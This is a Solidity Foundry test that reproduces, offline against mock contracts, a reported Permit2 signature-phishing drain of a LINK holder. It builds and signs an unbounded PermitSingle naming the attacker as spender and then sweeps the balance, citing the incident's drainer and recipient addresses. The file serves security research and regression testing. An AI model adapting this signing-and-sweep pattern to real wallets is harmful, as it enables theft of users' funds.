// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {ToyPermit2} from "../src/ToyPermit2.sol";

/// @title permit2-phishing tier (b): LINK Permit2 phishing drain (drain tx 2026-10-03).
/// @notice Minimized offline reproduction of the documented mechanism. The victim had the
///         standard long-standing `approve(Permit2, max)` on LINK (reported ~411 days old)
///         and signed ONE malicious Permit2 `PermitSingle` off-chain (no tx, nothing in the
///         wallet to inspect) naming the attacker as `spender` with an unbounded `amount`.
///         The attacker later submitted the signature and swept the whole LINK balance in a
///         single `transferFrom`. Reproduced via this repo's ToyPermit2 AllowanceTransfer
///         model (MIT, no AGPL/solmate); LINK is modeled as an 18-decimal MockERC20. The
///         verdict is derived from the real outcome (the full LINK balance left the victim),
///         not hardcoded. On-chain facts + sources in PROVENANCE.md.
contract LinkPermit2IncidentTest is Test {
    // Representative balance: the on-chain drain tx moved 12,041.303555521415836625 LINK.
    uint256 constant LINK_BAL = 12_041_303555521415836625; // 12,041.3035... LINK (18 decimals)

    bytes32 constant PERMIT_DETAILS_TYPEHASH =
        keccak256("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)");
    bytes32 constant PERMIT_SINGLE_TYPEHASH = keccak256(
        "PermitSingle(PermitDetails details,address spender,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"
    );

    ToyPermit2 permit2;
    MockERC20 link;
    uint256 constant OWNER_PK = 0x71619; // deterministic test key; not a real private key
    address victim;
    // Public on-chain addresses from the incident (Etherscan-labeled phishing):
    //   phishing drainer contract 0x0000cdCa...0000 submitted the signature (spender)
    //   funds landed at recipient 0xA6809aeD...66f73D
    address constant SPENDER = 0x0000cdCa01087D340e8fA4339b121B69a8aE0000; // Fake_Phishing1324813
    address constant RECIPIENT = 0xA6809aeDEbFA10A0C2dbcF3363cB0Ff37866f73D;

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[permit2-phishing] target=", target, " verdict=", verdict));
    }

    function _buildSingle() internal view returns (ToyPermit2.PermitSingle memory single) {
        uint48 exp = uint48(block.timestamp + 365 days);
        ToyPermit2.PermitDetails memory details =
            ToyPermit2.PermitDetails(address(link), type(uint160).max, exp, 0);
        single = ToyPermit2.PermitSingle({details: details, spender: SPENDER, sigDeadline: block.timestamp + 365 days});
    }

    function _signSingle(ToyPermit2.PermitSingle memory single) internal view returns (bytes memory sig) {
        bytes32 detailHash = keccak256(
            abi.encode(
                PERMIT_DETAILS_TYPEHASH,
                single.details.token,
                single.details.amount,
                single.details.expiration,
                single.details.nonce
            )
        );
        bytes32 structHash =
            keccak256(abi.encode(PERMIT_SINGLE_TYPEHASH, detailHash, single.spender, single.sigDeadline));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", permit2.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PK, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function _setup() internal {
        permit2 = new ToyPermit2();
        victim = vm.addr(OWNER_PK);
        link = new MockERC20();
        link.mint(victim, LINK_BAL);
        // the one-time, long-standing Permit2 approve the victim had already made on LINK
        vm.prank(victim);
        link.approve(address(permit2), type(uint256).max);
    }

    function test_linkVictim_oneSignature_drainsLink() public {
        _setup();

        ToyPermit2.PermitSingle memory single = _buildSingle();
        bytes memory sig = _signSingle(single);

        // Attacker submits the SINGLE phishing signature, then sweeps the full LINK balance.
        vm.startPrank(SPENDER);
        permit2.permit(victim, single, sig);
        permit2.transferFrom(victim, RECIPIENT, uint160(LINK_BAL), address(link));
        vm.stopPrank();

        bool drained = (link.balanceOf(victim) == 0);
        _report("link-permit2-victim", drained);

        assertTrue(drained, "one Permit2 signature should drain the victim's full LINK balance");
        assertEq(link.balanceOf(RECIPIENT), LINK_BAL, "attacker recipient took the LINK");
    }
}
